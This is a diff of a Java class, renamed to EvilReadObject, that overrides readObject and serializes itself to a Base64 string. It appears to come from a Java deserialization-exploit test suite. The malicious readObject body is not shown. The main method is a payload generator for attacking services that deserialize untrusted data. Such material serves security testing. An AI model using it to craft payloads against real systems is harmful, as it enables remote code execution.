@@ -1,8 +1,3 @@
-import com.sun.org.apache.xalan.internal.xsltc.DOM;
-import com.sun.org.apache.xalan.internal.xsltc.TransletException;
-import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
-import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
-import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import java.io.BufferedReader;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
@@ -16,10 +11,7 @@ import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.util.Base64;
 
-/**
- * @author threedr3am
- */
-public class Threedr3am_12 implements Serializable {
+public class EvilReadObject implements Serializable {
   private static final long serialVersionUID = 1L;
 
   private void  readObject(ObjectInputStream is) throws Throwable {
@@ -41,7 +33,7 @@ public class Threedr3am_12 implements Serializable {
 
   public static void main(String[] args) throws IOException {
     ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-    new ObjectOutputStream(byteArrayOutputStream).writeObject(new Threedr3am_12());
+    new ObjectOutputStream(byteArrayOutputStream).writeObject(new EvilReadObject());
     System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));
   }
 
